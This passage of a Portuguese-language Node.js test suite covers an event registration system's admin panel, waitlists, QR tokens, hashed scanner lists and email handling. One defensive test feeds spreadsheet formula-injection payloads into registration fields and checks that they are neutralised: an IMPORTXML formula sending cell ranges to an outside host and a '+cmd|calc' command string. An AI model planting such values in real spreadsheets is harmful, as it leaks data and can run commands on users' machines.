  assert.strictEqual(e.insc(1).nome, 'Maria Souza Lima'); assert.strictEqual(e.insc(1).email, 'novo@exemplo.com');
  assert(e.sent.some(m => m.to === 'novo@exemplo.com'));
  assert(e.tabela('Log').some(l => l.evento === 'admin_editar' && /Admin Teste/.test(l.detalhe) && /novo@exemplo/.test(l.detalhe)));
  assert.strictEqual(e.adm('admin_editar', { id, campos: { nome: 'Maria Souza Lima' } }).semMudancas, true);
});
test('cancelar inscrição libera vaga e promove a fila; reativar; reenviar QR; cancelar vaga', () => {
  const e = admin(); [1, 2, 3].forEach(n => e.enroll(n, 'A16'));
  const r = e.adm('admin_cancelar_inscrito', { id: e.insc(1).id });
  assert.strictEqual(r.ok, true); assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA');
  assert.strictEqual(e.adm('admin_reativar_inscrito', { id: e.insc(1).id }).ok, true); assert.strictEqual(e.insc(1).status, 'ATIVA');
  e.sent.length = 0; assert.strictEqual(e.adm('admin_reenviar_qr', { id: e.insc(1).id }).ok, true); assert(e.emailsDe(1).length === 1);
  const ia = e.tabela('Inscricoes_Atividades').find(x => x.inscrito_id === e.insc(2).id && x.status === 'CONFIRMADA');
  assert.strictEqual(e.adm('admin_vaga_cancelar', { iaId: ia.id }).ok, true);
  assert.strictEqual(e.adm('admin_inscrever', { id: e.insc(4).id, atividadeId: 'A16' }).ok, true);
});
test('atividades: listar, editar vagas (promove a fila), abrir/fechar e rejeitar valores inválidos', () => {
  const e = admin(); [1, 2, 3, 4].forEach(n => e.enroll(n, 'A16'));
  const lista = e.adm('admin_atividades').atividades.find(a => a.id === 'A16');
  assert.deepStrictEqual([lista.vagas_max, lista.ocupadas, lista.na_fila, lista.aberta], [2, 2, 2, true]);
  assert.strictEqual(e.adm('admin_atividade_set', { id: 'A16', campos: { vagas_max: 'abc' } }).ok, false);
  assert.strictEqual(e.adm('admin_atividade_set', { id: 'A16', campos: { vagas_max: -1 } }).ok, false);
  assert.strictEqual(e.adm('admin_atividade_set', { id: 'A16', campos: { vagas_max: 3 } }).ok, true);
  assert.strictEqual(e.status(3, 'A16'), 'CONFIRMADA'); assert.strictEqual(e.status(4, 'A16'), 'FILA:1');
  e.adm('admin_atividade_set', { id: 'A16', campos: { aberta: false, vagas_max: '' } });
  assert.strictEqual(e.ctx.getAtividade_('A16').inscricoes_abertas, 'NAO');
  assert.strictEqual(e.status(4, 'A16'), 'CONFIRMADA', 'sem limite promove todos');
  const l = e.adm('admin_atividade_lista', { id: 'A16' }); assert.strictEqual(l.inscritos.length, 4);
});
test('abrir/fechar inscrições do evento pelo painel reflete no site', () => {
  const e = admin();
  assert.strictEqual(e.adm('admin_set_inscricoes', { valor: 'FECHADAS' }).inscricoesAbertas, false);
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'config' }).inscricoesAbertas, false);
  assert.strictEqual(e.adm('admin_set_inscricoes', { valor: 'TALVEZ' }).ok, false);
  e.adm('admin_set_inscricoes', { valor: 'ABERTAS' }); assert.strictEqual(e.ctx.handleSeguro_({ action: 'config' }).inscricoesAbertas, true);
});
test('alertas, fila de e-mails e reprocessamento', () => {
  const e = admin(); e.state.quota = 0; e.reg(9); e.state.quota = 100;
  const a = e.adm('admin_alertas'); assert(a.alertas.some(x => x.tipo === 'COTA_EMAIL')); assert(a.emailsPendentes.length >= 1);
  const r = e.adm('admin_reprocessar'); assert(r.enviados >= 1); assert.strictEqual(e.adm('admin_alertas').emailsPendentes.length, 0);
});
test('exportação: tabelas permitidas, sem a coluna token, base de análise atualizada', () => {
  const e = admin();
  const t = e.adm('admin_tabela', { nome: 'inscritos' }); assert(!t.headers.includes('token')); assert.strictEqual(t.rows.length, 5);
  assert.strictEqual(e.adm('admin_tabela', { nome: 'base' }).rows.length, 5);
  assert.strictEqual(e.adm('admin_tabela', { nome: 'Config' }).ok, false);
  assert.strictEqual(e.adm('admin_tabela', { nome: 'certificados' }).ok, true);
});

console.log('Segurança dos dados');
test('injeção de fórmula: =, +, -, @ no início de nome/curso/e-mail/operador são neutralizados', () => {
  const e = novo(); e.abrir(); e.setCfg('PIN', '4321');
  const r = e.reg(1, { nome: '=IMPORTXML("http://x.com/"&A2:F9,"//a") Silva', curso: '+cmd|calc', email: '=x@exemplo.com' });
  assert.strictEqual(r.ok, true);
  const i = e.insc(1); assert(!/^[=+\-@]/.test(i.nome) && !/^[=+\-@]/.test(i.curso) && !/^[=@]/.test(i.email), JSON.stringify([i.nome, i.curso, i.email]));
  e.ctx.scanLote_({ pin: '4321', itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', token: i.token, clientId: 'z1', operador: '=HYPERLINK("http://x")' }] });
  assert(!/^[=+\-@]/.test(e.tabela('Portaria')[0].operador));
  e.setCfg('PIN_ADMIN', 'senhaForte123'); e.ctx.handleSeguro_({ action: 'admin_set_inscricoes', pin: 'senhaForte123', operador: '=1+1', valor: 'ABERTAS' });
  assert(!/^[=+\-@]/.test(e.tabela('Log').filter(l => l.evento === 'admin_set_inscricoes')[0].detalhe));
});
test('colunas de texto livre ficam formatadas como texto na planilha', () => {
  const e = novo(); const fmt = [];
  const Sh = e.sheets['Inscritos'].constructor; const orig = Sh.prototype.getRange;
  e.ctx.TEXT_COLUMNS['Inscritos'].forEach(c => fmt.push(c));
  ['nome', 'curso', 'periodo', 'email'].forEach(c => assert(fmt.includes(c), c));
});

test('SITE_URL vazio na planilha: o e-mail mantém o botão (endereço padrão) e a migração preenche o campo', () => {
  const e = novo(); e.abrir(); e.setCfg('SITE_URL', '');
  e.reg(1);
  assert(e.sent[0].htmlBody.includes('/inscricao/qr.html?t='), 'botão do QR ausente no e-mail');
  assert(e.sent[0].htmlBody.includes('https://krcataclysm.github.io/SemanadaEngenhariadeProd'));
  e.ctx.preencherPadroes_(); assert.strictEqual(e.ctx.getConfig_().SITE_URL, 'https://krcataclysm.github.io/SemanadaEngenhariadeProd');
  e.setCfg('SITE_URL', 'https://outro.exemplo/site/'); e.ctx.preencherPadroes_();
  assert.strictEqual(e.ctx.getConfig_().SITE_URL, 'https://outro.exemplo/site/', 'não sobrescreve valor preenchido');
});

test('e-mail: QR e logo embutidos, botão "Abrir meu QR Code" com o token e texto de apoio (não depende de imagem externa)', () => {
  const e = novo(); e.abrir(); const r = e.reg(1); const m = e.sent[0];
  assert(m.inlineImages.qr.bytes.length > 100 && m.inlineImages.logo.bytes.length > 500, 'imagens embutidas');
  assert(m.htmlBody.includes('cid:qr') && m.htmlBody.includes('cid:logo'));
  assert(!/https?:\/\/[^"]*logo-caepro\.png/.test(m.htmlBody), 'sem logo externo');
  assert(m.htmlBody.includes('/inscricao/qr.html?t=' + r.token) && m.htmlBody.includes('Abrir meu QR Code'));
  assert(m.htmlBody.includes('Se a imagem do QR Code não aparecer'));
  assert(m.body.includes('Abrir meu QR Code: https://') && m.body.includes('/inscricao/qr.html?t=' + r.token));
  assert(m.inlineImages.logo.type === 'image/png');
});

console.log('Tokens e scanner (hash)');
test('scanner: a lista leva só o hash do token (nenhum QR válido no aparelho) e o lote aceita o hash', () => {
  const e = scan(); const tk = e.token(1);
  const l = e.ctx.scanLista_({ pin: '4321' }); const linha = l.i.find(x => x[0] === e.insc(1).id);
  assert(l.v === 2 && /^[a-f0-9]{64}$/.test(linha[1]) && linha[1] !== tk, 'hash no lugar do token');
  assert(!JSON.stringify(l).includes(tk), 'o token não aparece em lugar nenhum da lista');
  assert.strictEqual(linha[1], require('crypto').createHash('sha256').update(tk).digest('hex'));
  const ok = e.ctx.scanLote_({ pin: '4321', itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', h: linha[1], clientId: 'h1', operador: 'Ana', ts: Date.now() }] });
  assert.strictEqual(ok.resultados[0].resultado, 'REGISTRADO');
  const ruim = e.ctx.scanLote_({ pin: '4321', itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', h: 'a'.repeat(64), clientId: 'h2', operador: 'Ana' }, { kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', h: 'xyz', clientId: 'h3', operador: 'Ana' }] });
  assert.deepStrictEqual(ruim.resultados.map(x => x.resultado), ['TOKEN_INVALIDO', 'TOKEN_INVALIDO']);
  const velho = e.ctx.scanLote_({ pin: '4321', itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-12', token: tk, clientId: 'h4', operador: 'Ana' }] });   // versão antiga do scanner
  assert.strictEqual(velho.resultados[0].resultado, 'REGISTRADO');
});
test('admin: gerar novo QR invalida o anterior (scanner, página do participante), reenvia o e-mail e registra no log', () => {
  const e = admin(); e.setCfg('PIN', '4321'); const antigo = e.token(1), id = e.insc(1).id;
  assert.strictEqual(e.adm('admin_novo_qr', { id, operador: '' }).code, 'OPERADOR');
  assert.strictEqual(e.ctx.getMe_({ token: antigo }).ok, true);
  const antes = e.emailsDe(1).length; const r = e.adm('admin_novo_qr', { id }); assert.strictEqual(r.ok, true);
  const novo = e.token(1); assert(novo !== antigo && /^[a-f0-9]{32}$/.test(novo));
  assert.strictEqual(e.ctx.getMe_({ token: antigo }).code, 'TOKEN'); assert.strictEqual(e.ctx.getMe_({ token: novo }).ok, true);
  const lote = e.ctx.scanLote_({ pin: '4321', itens: [{ kind: 'scan', modo: 'PORTARIA', dia: '2026-11-11', token: antigo, clientId: 'n1', operador: 'A' }] });
  assert.strictEqual(lote.resultados[0].resultado, 'TOKEN_INVALIDO');
  assert(e.emailsDe(1).length > antes && e.emailsDe(1).slice(-1)[0].htmlBody.includes('qr.html?t=' + novo), 'e-mail novo com o QR novo');
  assert(e.ctx.readAll_('Log').some(l => l.evento === 'admin_novo_qr' && /Admin Teste/.test(l.detalhe)));
  assert(!JSON.stringify(e.adm('admin_ficha', { id })).includes(novo), 'token nunca vai para o painel');
  e.adm('admin_cancelar_inscrito', { id }); assert.strictEqual(e.adm('admin_novo_qr', { id }).ok, false);
});

test('e-mail: botão "Escolher atividades" aparece só quando há atividade aberta (ou a pessoa já tem atividades), sem e-mail extra', () => {
  const e = novo(); e.abrir(); e.reg(1);
  assert(!e.sent[0].htmlBody.includes('atividades.html') && !e.sent[0].body.includes('Escolher atividades'));
  e.ativ('A16', { vagas_max: 5, inscricoes_abertas: 'SIM' });
  e.reg(2); const m2 = e.sent[e.sent.length - 1];
  assert(m2.htmlBody.includes('/inscricao/atividades.html?t=' + e.token(2)) && m2.body.includes('Escolher atividades:') && !/Novidades em breve/.test(m2.htmlBody), 'com atividade aberta o botão aparece');
  e.enroll(2, 'A16'); e.ativ('A16', { inscricoes_abertas: 'NAO' });   // pessoa já tem atividade: o e-mail da atividade mantém o acesso
  const antes = e.sent.length; e.ctx.processOutbox_(10);
  const emAtiv = e.sent.slice(antes).find(x => x.to === 'p2@exemplo.com'); assert(!emAtiv || emAtiv.htmlBody.includes('atividades.html?t='));
  assert.strictEqual(e.emailsDe(1).length, 1, 'quem já recebeu o e-mail não ganha e-mail extra quando as atividades abrem');
});

console.log('Situações reais (achadas na simulação do evento)');
test('inscrição repetida com a matrícula de outra pessoa: reenvio da confirmação limitado (não enche o e-mail nem gasta a cota)', () => {
  const e = novo(); e.abrir(); e.reg(1);
  for (let i = 0; i < 10; i++) e.ctx.register_({ nome: 'Outra Pessoa Silva', curso: 'EP', periodo: '1º', matricula: '20240001', email: 'x@exemplo.com' });
  assert.strictEqual(e.tabela('Fila_Email').filter(o => o.tipo === 'CONFIRMACAO').length, 3, 'original + 2 reenvios');
  const r = e.ctx.register_({ nome: 'Outra Pessoa Silva', curso: 'EP', periodo: '1º', matricula: '20240001', email: 'x@exemplo.com' });
  assert(r.ok && r.status === 'JA_INSCRITO' && /não será reenviada/.test(r.mensagem), 'mensagem de limite');
  assert.strictEqual(e.ctx.adminReenviarQr_({ id: e.insc(1).id, operador: 'Lilian' }).ok, true, 'o painel continua podendo reenviar');
});
test('portaria: leituras de dois aparelhos chegando fora de ordem recebem ENTRADA/SAÍDA pelo horário; desfazer reordena', () => {
  const e = scan(); const t0 = Date.now(), tk = e.token(1), mk = (ts, cid) => e.por(1, { ts, clientId: cid, dia: '2026-11-11' });
  e.lote([mk(t0 + 3 * 3600e3, 'saida-online')]);                     // a saída (11h) chega primeiro, do aparelho online
  e.lote([mk(t0, 'entrada-offline')]);                               // a entrada (8h) chega depois, do aparelho que estava offline
  const l = e.tabela('Portaria').filter(x => x.status === 'VALIDO').sort((a, b) => a.ts - b.ts);
  assert.deepStrictEqual(Array.from(l.map(x => x.tipo + '@' + x.client_id)), ['ENTRADA@entrada-offline', 'SAIDA@saida-online'], 'ordem pelo horário, não pela chegada');
  e.ctx.recalcularPermanencia_(); assert(Math.abs(Number(e.tabela('Certificados').find(c => c.inscrito_id === e.insc(1).id).horas) - 3) < 0.01, '3 horas de permanência');
  e.lote([{ kind: 'undo', clientId: 'entrada-offline' }]);           // desfazer a entrada: a saída restante vira a única leitura (ENTRADA) e fica pendente
  assert.deepStrictEqual(Array.from(e.tabela('Portaria').filter(x => x.status === 'VALIDO').map(x => x.tipo)), ['ENTRADA']);
});

console.log('Nome ao lado do código nas abas de movimento');
test('portaria, presença, atividades, e-mails, permanência e certificados passam a gravar o NOME junto do código', () => {
  const e = scan(); const t0 = Date.now(); const p1 = e.insc(1), p2 = e.insc(2);
  e.lote([e.por(1, { ts: t0 }), e.por(2, { ts: t0 + 60000 }), e.por(1, { ts: t0 + 3600e3 })]);
  e.ativ('A16', { vagas_max: 5, inscricoes_abertas: 'SIM' }); e.enroll(1, 'A16');
  e.lote([{ kind: 'scan', modo: 'ATIVIDADE', atividadeId: 'A16', token: e.token(1), clientId: 'pa1', operador: 'Ana', ts: t0 }]);
  e.ctx.recalcularPermanencia_();
  const nomeDe = id => e.insc(Number(id.slice(1))).nome;
  ['Portaria', 'Presenca_Atividades', 'Inscricoes_Atividades', 'Fila_Email', 'Permanencia', 'Certificados'].forEach(aba => {
    const linhas = e.tabela(aba); assert(linhas.length > 0, aba + ' vazia');
    linhas.forEach(r => { assert.strictEqual(r.nome, nomeDe(r.inscrito_id), `${aba}: nome ao lado de ${r.inscrito_id}`); });
  });
  assert.strictEqual(e.tabela('Portaria').filter(r => r.inscrito_id === p1.id).length, 2);
});
test('linhas antigas (sem nome) são completadas; trocar o nome do inscrito atualiza todas as abas; colunas técnicas são ocultadas uma vez', () => {
  const e = scan(); const t0 = Date.now(); e.lote([e.por(1, { ts: t0 }), e.por(2, { ts: t0 + 1000 })]); e.enroll(1, 'A16');
  // simula linhas gravadas por versão anterior (nome em branco)
  e.tabela('Portaria').forEach(r => e.ctx.updateRow_('Portaria', r._row, { nome: '' })); e.tabela('Fila_Email').forEach(r => e.ctx.updateRow_('Fila_Email', r._row, { nome: '' }));
  assert(e.tabela('Portaria').every(r => r.nome === ''));
  e.ctx.preencherNomes_(false); assert(e.tabela('Portaria').every(r => r.nome === e.insc(Number(r.inscrito_id.slice(1))).nome) && e.tabela('Fila_Email').every(r => r.nome));
  const id = e.insc(1).id; const adm = Object.assign(e, {}); e.setCfg('PIN_ADMIN', 'senhaForte123');
  assert.strictEqual(e.ctx.handleSeguro_({ action: 'admin_editar', pin: 'senhaForte123', operador: 'Lilian', id, campos: { nome: 'Nome Novo Completo' } }).ok, true);
  ['Portaria', 'Inscricoes_Atividades', 'Fila_Email'].forEach(aba => e.tabela(aba).filter(r => r.inscrito_id === id).forEach(r => assert.strictEqual(r.nome, 'Nome Novo Completo', aba)));
  e.props.COLUNAS_OCULTAS_V1 = undefined; const antes = (e.sheets.Portaria.ocultas || []).length; e.ctx.ocultarColunasTecnicas_(); assert.strictEqual(e.sheets.Portaria.ocultas.length - antes, 4, '4 colunas técnicas'); e.ctx.ocultarColunasTecnicas_(); assert.strictEqual(e.sheets.Portaria.ocultas.length - antes, 4, 'só uma vez (não reaplica depois que você reexibir)');
});

console.log('Controle do administrador');
test('admin: registro de alterações lista só ações do painel (quem/quando/o quê), mais recentes primeiro', () => {
  const e = admin(); const id = e.insc(1).id;
  e.adm('admin_editar', { id, campos: { periodo: '6º' }, operador: 'Lilian' }); e.adm('admin_novo_qr', { id, operador: 'Rayan' });
  const l = e.adm('admin_log'); assert(l.ok && l.itens.length >= 2);
  assert.strictEqual(l.itens[0].evento, 'novo_qr'); assert(/Rayan/.test(l.itens[0].detalhe)); assert(l.itens.every(x => !/^(scan_lote|inscricao_)/.test(x.evento)));
  assert(!JSON.stringify(l).includes(e.token(1)), 'nenhum token no registro');
});
test('admin: possíveis duplicados (mesmo nome sem acento/maiúsculas com matrículas diferentes, ou mesmo e-mail) e ignora cancelados', () => {
  const e = admin();
  e.reg(10, { nome: 'João da Silva' }); e.reg(11, { nome: 'JOAO DA SILVA' }); e.reg(12, { nome: 'Outra Pessoa Qualquer', email: 'dup@exemplo.com' }); e.reg(13, { nome: 'Mais Uma Pessoa Distinta', email: 'dup@exemplo.com' });
  const g = e.adm('admin_duplicados').grupos;
  assert(g.some(x => x.tipo === 'NOME' && x.inscritos.length === 2) && g.some(x => x.tipo === 'EMAIL' && x.chave === 'dup@exemplo.com'));
  assert(!g.some(x => x.inscritos.some(i => /Pessoa Teste/.test(i.nome))), 'inscritos sem repetição não aparecem');
  e.adm('admin_cancelar_inscrito', { id: e.insc(11).id }); assert(!e.adm('admin_duplicados').grupos.some(x => x.tipo === 'NOME'), 'cancelado não conta');
});
test('admin: cópia de segurança sob demanda e troca do PIN do scanner (regras, desbloqueio e log sem o PIN)', () => {
  const e = admin(); e.setCfg('PIN', '4321');
  const b = e.adm('admin_backup'); assert(b.ok && /^https:\/\/exemplo\/Backup/.test(b.url));
  assert.strictEqual(e.adm('admin_set_pin', { novoPin: '12' }).code, 'PIN_INVALIDO');
  assert.strictEqual(e.adm('admin_set_pin', { novoPin: 'senhaForte123' }).code, 'PIN_INVALIDO');
  assert.strictEqual(e.adm('admin_set_pin', { novoPin: '9999', operador: '' }).code, 'OPERADOR');
  for (let i = 0; i < 8; i++) e.ctx.scanLista_({ pin: 'errado' }); assert.strictEqual(e.ctx.scanLista_({ pin: '4321' }).code, 'BLOQUEADO');
  assert.strictEqual(e.adm('admin_set_pin', { novoPin: '9999' }).ok, true);
  assert.strictEqual(e.ctx.scanLista_({ pin: '4321' }).code, 'INVALIDO', 'PIN antigo perde o acesso'); assert.strictEqual(e.ctx.scanLista_({ pin: '9999' }).ok, true, 'novo PIN funciona e o bloqueio foi zerado');
  const log = JSON.stringify(e.ctx.readAll_('Log')); assert(!log.includes('9999') && !log.includes('4321'), 'PIN fora do log');
  assert(e.adm('admin_log').itens.some(x => x.evento === 'set_pin_scanner'));
});

test('admin: abrir a inscrição de atividade sem "exige inscrição" também marca exige (aparece para os participantes); exige pode ser editado', () => {
  const e = admin(); const id = 'A11';   // palestra: exige_inscricao = NAO
  assert.strictEqual(e.ctx.getAtividade_(id).exige_inscricao, 'NAO');
  assert(!e.ctx.getMe_({ token: e.token(1) }).atividades.some(a => a.id === id));
  assert.strictEqual(e.adm('admin_atividade_set', { id, campos: { aberta: true } }).ok, true);
  assert.strictEqual(e.ctx.getAtividade_(id).exige_inscricao, 'SIM'); assert.strictEqual(e.ctx.getAtividade_(id).inscricoes_abertas, 'SIM');
  assert(e.ctx.getMe_({ token: e.token(1) }).atividades.some(a => a.id === id && a.aberta), 'aparece para o participante');
  assert.strictEqual(e.enroll(1, id).ok, true);
  e.adm('admin_atividade_set', { id, campos: { aberta: false } }); assert.strictEqual(e.ctx.getAtividade_(id).exige_inscricao, 'SIM', 'fechar não desmarca exige');
  e.adm('admin_atividade_set', { id: 'A12', campos: { exige: false } }); assert.strictEqual(e.ctx.getAtividade_('A12').exige_inscricao, 'NAO');
});

console.log(`\n${passed} ok, ${failed} falharam`);
process.exit(failed ? 1 : 0);
